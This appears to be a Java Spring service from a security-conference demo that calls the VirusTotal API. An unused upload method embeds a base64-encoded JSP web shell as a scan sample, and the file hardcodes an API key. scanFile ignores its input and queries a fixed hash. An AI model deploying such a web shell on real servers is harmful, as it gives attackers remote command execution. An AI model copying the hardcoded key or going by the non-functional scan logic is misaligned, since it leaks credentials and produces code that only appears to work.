package bg.bsides.SDLC.Demo.service.impl;

import bg.bsides.SDLC.Demo.model.FileResultVT;
import bg.bsides.SDLC.Demo.service.VirusTotalService;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;
import org.springframework.stereotype.Service;
import org.springframework.web.multipart.MultipartFile;

@Service
public class VirusTotalServiceImpl implements VirusTotalService {
  @Override
  public String scanFile(MultipartFile file) throws IOException {
//    uploadFile();
    OkHttpClient client = new OkHttpClient();

    Request request = new Request.Builder()
        .url("https://www.virustotal.com/api/v3/files/80be53035ee5f1a91ca3c2778384bf7b")
        .get()
        .addHeader("Accept", "application/json")
        .addHeader("x-apikey", "85918d6913c1fb7d601e584371c44b81851dfe1a88ba4a9f776d7e75d06cf757")
        .build();

    ResponseBody response = client.newCall(request).execute().body();
    ObjectMapper objectMapper = new ObjectMapper();
    FileResultVT fileResponse = objectMapper.readValue(response.string(), FileResultVT.class);
    return fileResponse.getData().getAttributes().getPopularThreatClassification().getSuggestedThreatLabel();
  }

  private void uploadFile() throws IOException {
    OkHttpClient client = new OkHttpClient();

    MediaType mediaType = MediaType.parse("multipart/form-data; boundary=---011000010111000001101001");
    RequestBody body = RequestBody.create(mediaType, "-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\ndata:application/octet-stream;name=shell.jsp;base64,PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT4NCjwlDQolPg0KPEhUTUw+PEJPRFk+DQpDb21tYW5kcyB3aXRoIEpTUA0KPEZPUk0gTUVUSE9EPSJHRVQiIE5BTUU9Im15Zm9ybSIgQUNUSU9OPSIiPg0KPElOUFVUIFRZUEU9InRleHQiIE5BTUU9ImNtZCI+DQo8SU5QVVQgVFlQRT0ic3VibWl0IiBWQUxVRT0iU2VuZCI+DQo8L0ZPUk0+DQo8cHJlPg0KPCUNCmlmIChyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikgIT0gbnVsbCkgew0KICAgIG91dC5wcmludGxuKCJDb21tYW5kOiAiICsgcmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpICsgIjxCUj4iKTsNCg0KICAgIFByb2Nlc3MgcDsNCiAgICBpZiAoIFN5c3RlbS5nZXRQcm9wZXJ0eSgib3MubmFtZSIpLnRvTG93ZXJDYXNlKCkuaW5kZXhPZigid2luZG93cyIpICE9IC0xKXsNCiAgICAgICAgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoImNtZC5leGUgL0MgIiArIHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSk7DQogICAgfQ0KICAgIGVsc2V7DQogICAgICAgIHAgPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSk7DQogICAgfQ0KICAgIE91dHB1dFN0cmVhbSBvcyA9IHAuZ2V0T3V0cHV0U3RyZWFtKCk7DQogICAgSW5wdXRTdHJlYW0gaW4gPSBwLmdldElucHV0U3RyZWFtKCk7DQogICAgRGF0YUlucHV0U3RyZWFtIGRpcyA9IG5ldyBEYXRhSW5wdXRTdHJlYW0oaW4pOw0KICAgIFN0cmluZyBkaXNyID0gZGlzLnJlYWRMaW5lKCk7DQogICAgd2hpbGUgKCBkaXNyICE9IG51bGwgKSB7DQogICAgb3V0LnByaW50bG4oZGlzcik7DQogICAgZGlzciA9IGRpcy5yZWFkTGluZSgpOw0KICAgIH0NCn0NCiU+DQo8L3ByZT4NCjwvQk9EWT48L0hUTUw+DQo=\r\n-----011000010111000001101001--\r\n\r\n");
    Request request = new Request.Builder()
        .url("https://www.virustotal.com/api/v3/files")
        .post(body)
        .addHeader("x-apikey", "asd")
        .addHeader("Content-Type", "multipart/form-data; boundary=---011000010111000001101001")
        .build();

    Response response = client.newCall(request).execute();
  }
}
